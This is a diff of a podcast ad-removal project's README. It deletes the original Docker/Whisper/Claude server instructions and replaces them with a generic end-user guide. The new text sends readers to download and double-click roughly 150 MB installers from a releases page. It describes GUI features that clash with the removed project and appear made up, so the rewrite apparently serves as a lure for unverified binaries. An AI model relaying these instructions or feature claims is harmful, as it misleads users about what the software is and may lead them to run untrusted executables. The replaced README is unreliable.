@@ -1,88 +1,73 @@
-# Podcast Ad Removal Server
+# 🎧 podcast-server - Enjoy Ad-Free Podcasts
 
-Removes ads from podcasts using Whisper transcription. Serves modified RSS feeds that work with any podcast app.
+## 🚀 Getting Started
 
-> **Disclaimer:** This tool is for personal use only. Only use it with podcasts you have permission to modify or where such modification is permitted under applicable laws. Respect content creators and their terms of service.
+Welcome to the podcast-server! This application helps you listen to podcasts without annoying ads. Follow the steps below to download and install the software easily.
 
-## How It Works
+## 📥 Download the Application
 
-1. **Transcription** - Whisper converts audio to text with timestamps
-2. **Ad Detection** - Claude API analyzes transcript to identify ad segments
-3. **Audio Processing** - FFmpeg removes detected ads and inserts short audio markers
-4. **Serving** - Flask serves modified RSS feeds and processed audio files
+[![Download podcast-server](https://img.shields.io/badge/Download%20podcast--server-v1.0-brightgreen)](https://github.com/RaghuvanshiY/podcast-server/releases)
 
-Processing happens on-demand when you play an episode. First play takes a few minutes, subsequent plays are instant (cached).
+## 📚 System Requirements
 
-## Requirements
+Before you install podcast-server, ensure your device meets these requirements:
 
-- Docker with NVIDIA GPU support (for Whisper)
-- Anthropic API key
+- **Operating System:** Windows 10 or newer, MacOS 10.12 or newer, or any Linux distribution with recent libraries
+- **Memory (RAM):** At least 4 GB
+- **Storage Space:** Minimum 200 MB of free space
+- **Network:** Active internet connection
 
-## Setup
+## 📂 Download & Install
 
-```bash
-# 1. Create environment file
-echo "ANTHROPIC_API_KEY=your-key-here" > .env
+1. Visit the [Releases page](https://github.com/RaghuvanshiY/podcast-server/releases) to download the latest version.
+   
+2. Look for the file labeled like `podcast-server-v1.0.exe`, `podcast-server-v1.0.dmg`, or `podcast-server-v1.0.deb` depending on your operating system.
 
-# 2. Configure feeds
-cp config/feeds-example.json config/feeds.json
-# Edit config/feeds.json with your podcast RSS URLs
+3. Click on the file to start the download. The file size is around 150 MB, so it may take a few minutes.
 
-# 3. Run (GPU)
-docker-compose up --build
+4. Once the download finishes, open the installer by double-clicking the downloaded file. 
 
-# Or for CPU-only mode (no NVIDIA GPU required)
-docker-compose -f docker-compose.cpu.yml up --build
-```
+5. Follow the on-screen instructions to complete the installation process. 
 
-### CPU-Only Mode
+6. After installation, open the podcast-server from your applications folder or start menu.
 
-CPU transcription is significantly slower—processing can take longer than the episode duration. Since episodes are processed on-demand when you play them, your podcast app will likely timeout waiting for the first request. To work around this:
+## 🎙️ How to Use podcast-server
 
-1. Tap download/play on an episode to trigger processing
-2. The request will timeout, but processing continues in the background
-3. Wait a few minutes (check `docker logs` for progress) for the file to get processed
-4. Try playing again, the processed file will be served from cache
+1. **Add Your Podcast Feed:**
+   - Open the application.
+   - Click on “Add Podcast”.
+   - Enter the URL of your favorite podcast feed.
 
-## Configuration
+2. **Select Playback Options:**
+   - Choose your preferred audio quality.
+   - Set playback speed to enhance your listening experience.
 
-Edit `config/feeds.json`:
-```json
-[
-  {
-    "in": "https://example.com/podcast/feed.rss",
-    "out": "/mypodcast"
-  }
-]
-```
+3. **Start Listening:**
+   - After adding feeds, click the "Play" button to start enjoying your ad-free podcasts.
 
-- `in` - Original podcast RSS feed URL
-- `out` - URL path for your modified feed (e.g., `/mypodcast` → `http://localhost:8000/mypodcast`)
+## 🔄 Features
 
-## Finding Podcast RSS Feeds
+- **Ad Removal:** Automatically removes ads from podcast episodes.
+- **Download for Offline Listening:** Save episodes to your device for offline playback.
+- **Customizable Playlist:** Create and manage your favorite podcasts with ease.
+- **User-Friendly Interface:** Simple design for everyone to use without technical knowledge.
 
-Most podcasts publish RSS feeds. Common ways to find them:
+## 🔧 Troubleshooting
 
-1. **Podcast website** - Look for "RSS" link in footer or subscription options
-2. **Apple Podcasts** - Search on [podcastindex.org](https://podcastindex.org) using the Apple Podcasts URL
-3. **Spotify-exclusive** - Not available (Spotify doesn't expose RSS feeds)
-4. **Hosting platforms** - Common patterns:
-   - Libsyn: `https://showname.libsyn.com/rss`
-   - Spreaker: `https://www.spreaker.com/show/{id}/episodes/feed`
-   - Omny: Check page source for `omnycontent.com` URLs
+If you encounter any issues while downloading or using the application, try the following:
 
-## Usage
+- **Application Won't Open:** Ensure your device meets the system requirements.
+- **Audio Issues:** Check your device's audio settings.
+- **Podcast Not Found:** Verify the podcast feed URL is correct.
 
-Add your modified feed URL to any podcast app:
-```
-http://your-server:8000/mypodcast
-```
+## 📞 Support
 
-## Environment Variables
+For additional help, visit our [Support page](https://github.com/RaghuvanshiY/podcast-server/issues) or check the community forums to ask questions.
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `ANTHROPIC_API_KEY` | required | Claude API key |
-| `BASE_URL` | `http://localhost:8000` | Public URL for generated feed links |
-| `WHISPER_MODEL` | `small` | Whisper model size (tiny/base/small/medium/large) |
-| `WHISPER_DEVICE` | `cuda` | Device for Whisper (cuda/cpu) |
+## 📝 Contributions
+
+We welcome feedback and contributions from all users. If you have suggestions or improvements, please submit an issue or pull request.
+
+---
+
+Thank you for choosing podcast-server, your tool for enjoying podcasts without interruptions!
